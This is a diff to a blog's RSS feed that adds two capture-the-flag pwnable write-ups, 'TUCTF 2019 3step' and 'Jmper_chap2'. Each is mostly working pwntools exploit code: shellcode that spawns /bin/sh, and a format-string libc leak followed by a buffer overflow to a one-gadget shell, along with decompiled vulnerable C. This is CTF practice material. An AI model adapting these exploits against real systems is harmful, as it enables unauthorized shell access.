@@ -7,10 +7,172 @@
     <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator>
     <language>en-us</language>
     <copyright>&amp;copy; {year} j3rrry</copyright>
-    <lastBuildDate>Tue, 02 Jul 2019 04:36:38 +0900</lastBuildDate>
+    <lastBuildDate>Tue, 03 Dec 2019 03:33:19 +0900</lastBuildDate>
     
 	    <atom:link href="/post/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>TUCTF 2019 Pwnable 3step</title>
+      <link>/post/3step/</link>
+      <pubDate>Tue, 03 Dec 2019 03:33:19 +0900</pubDate>
+      
+      <guid>/post/3step/</guid>
+      <description>&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;from pwn import *
+
+def start():
+    e = ELF(&#39;./3step&#39;)
+    r = remote(&#39;chal.tuctf.com&#39;, 30504)
+
+    return e, r
+
+def info():
+    r.recvuntil(&#39;0x&#39;)
+    bss = int(r.recvline(), 16)
+    stack = int(r.recvline(), 16)
+    log.info(hex(bss) + &#39; bss&#39;)
+    log.info(hex(stack) + &#39; stack&#39;)
+
+    return bss, stack
+
+def step1():
+    r.recvuntil(&#39;: &#39;)
+    r.send(&#39;/bin/sh&#39;)
+
+def step2():
+    r.recvuntil(&#39;: &#39;)
+    r.send(shellcode)
+
+def step3():
+    r.recvuntil(&#39;: &#39;)
+    r.send(p32(stack))
+
+if __name__ == &#39;__main__&#39;:
+    e, r = start()
+    bss, stack = info()
+
+    shellcode = &#39;&#39;&#39;
+        mov ebx, {}
+        xor ecx, ecx
+        xor edx, edx
+        xor eax, eax
+        mov al, 0xb
+        int 0x80
+        mov al, 0xb
+        int 0x80
+    &#39;&#39;&#39;.format(bss)
+    shellcode = asm(shellcode)
+
+    step1()
+    step2()
+    step3()
+
+    r.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Jmper_chap2</title>
+      <link>/post/jmper_chap2/</link>
+      <pubDate>Sat, 02 Nov 2019 18:32:15 +0900</pubDate>
+      
+      <guid>/post/jmper_chap2/</guid>
+      <description>&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void main(__int64 argc, char **argv, char **env)
+{
+  char **_argv; // [sp+0h] [bp-20h]@1
+  int _menu; // [sp+14h] [bp-Ch]@2
+
+  _argv = argv;
+  qword_202060[29] = (void (__fastcall *)(_QWORD, _QWORD))off_202010;
+  setvbuf(stdout, 0, 2, 0);
+  puts(&amp;quot;let&#39;s Chasing jumper. Paladin!&amp;quot;);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      menu();
+      _menu = getchar();
+      getchar();
+      fflush(stdin);
+      if ( _menu != &#39;1&#39; )
+        break;
+      printf(&amp;quot;Damn! we lost jumper trace.. you should find it yourself.&amp;quot;);
+    }
+    if ( _menu == &#39;2&#39; )
+      break;
+    puts(&amp;quot;wrong input!&amp;quot;);
+  }
+  printf(&amp;quot;open the portal. FIRST TRY : &amp;quot;);
+  if ( !_setjmp((struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) )&amp;amp;qword_202060[4]) )
+    sub_95A((__int64)qword_202060);
+  puts(&amp;quot;\nYou Failed! I&#39;ll give you one more chance! &amp;quot;);
+  printf(&amp;quot;SECOND TRY : &amp;quot;);
+  if ( !_setjmp((struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) )&amp;amp;qword_202060[4]) )
+    sub_95A((__int64)qword_202060);
+  puts(&amp;quot;You Failed Again! we lost signal..&amp;quot;);
+  exit(0);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;메뉴는 다음과 같습니다.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int menu()
+{
+  puts(&amp;quot;what do you want? &amp;quot;);
+  puts(&amp;quot;1 : find jumper&#39;s traces.&amp;quot;);
+  puts(&amp;quot;2 : open the portal &amp;quot;);
+  return printf(&amp;quot;&amp;gt; &amp;quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void __fastcall __noreturn sub_95A(__int64 s)
+{
+  fflush(stdin);
+  gets(s);
+  if ( strchr((const char *)s, &#39;n&#39;) )
+  {
+    puts(&amp;quot;wait, what are you doing?&amp;quot;);
+    exit(0);
+  }
+  qword_202060[29](s, &#39;n&#39;);
+  longjmp((struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) )(s + 32), 1);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;.data:0000000000202010 off_202010      dq offset printf        ; DATA XREF: main+1Ao
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;from pwn import *
+
+def main():
+    r = remote(&#39;172.17.0.2&#39;, 1300)
+    #r = remote(&#39;1.224.175.17&#39;, 9982)
+    libc = ELF(&#39;./libc.so.6&#39;)
+    one_shot = 0x10a38c
+
+    r.recvuntil(&#39;&amp;gt; &#39;)
+    r.sendline(str(2))
+
+    raw_input()
+    r.recvuntil(&#39;: &#39;)
+    r.sendline(&#39;%2$p&#39;)
+    a0 = r.recvline()
+    libc.address = int(a0, 16) - 413312
+    log.info(hex(libc.address))
+    # %2$p = libc + 413312
+
+    r.recvuntil(&#39;: &#39;)
+    r.sendline(&#39;A&#39; * 0xe8 + p64(libc.address + one_shot))
+    #r.sendline(&#39;a&#39; * (8 * 29) + &#39;b&#39;)
+
+    r.interactive()
+
+if __name__ == &#39;__main__&#39;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
     
     <item>
       <title>Troubleshooting</title>
